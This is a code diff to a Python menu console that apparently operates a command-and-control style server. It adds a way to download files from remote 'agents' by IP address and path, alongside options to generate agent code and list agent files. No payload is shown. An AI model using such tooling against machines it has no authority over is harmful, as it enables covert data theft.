@@ -3,8 +3,8 @@ from rich.table import Table
 import Gateways.CybServerGateway as cybServerGateway
 
 console = Console()
-options_rows = ['Generate code for agent', 'Download file from agent', 'List agents',
-                'Close agent connection', 'Exit']
+options_rows = ['Generate code for agent', 'Download file from agent', 'List agent\'s files from directory',
+                'List agents', 'Close agent connection', 'Exit']
 
 
 def menu():
@@ -22,7 +22,9 @@ def menu():
     if value == '1':
         generate_code_for_agent()
     if value == '2':
-        generate_code_for_agent()
+        download_file_from_agent()
+    if value == '3':
+        list_agent_files()
     else:
         menu()
 
@@ -39,6 +41,17 @@ def generate_code_for_agent():
     menu()
 
 
+def download_file_from_agent():
+    console.print("Insert agent's ip address")
+    ip_address = input()
+    console.print("Insert agent's file path")
+    file_path = input()
+    cybServerGateway.download_file_from_agent(cybServerGateway.DownloadFileFromAgentInputType(
+        ip_address=ip_address, file_path=file_path))
+    console.print('Task for downloading file from an agent scheduled successfully')
+    menu()
+
+
 def list_agent_files():
     console.print("Insert agent's ip address")
     ip_address = input()
@@ -48,5 +61,3 @@ def list_agent_files():
         ip_address=ip_address, dir_path=dir_path))
     console.print('Task for listing agent\'s files scheduled successfully')
     menu()
-
-
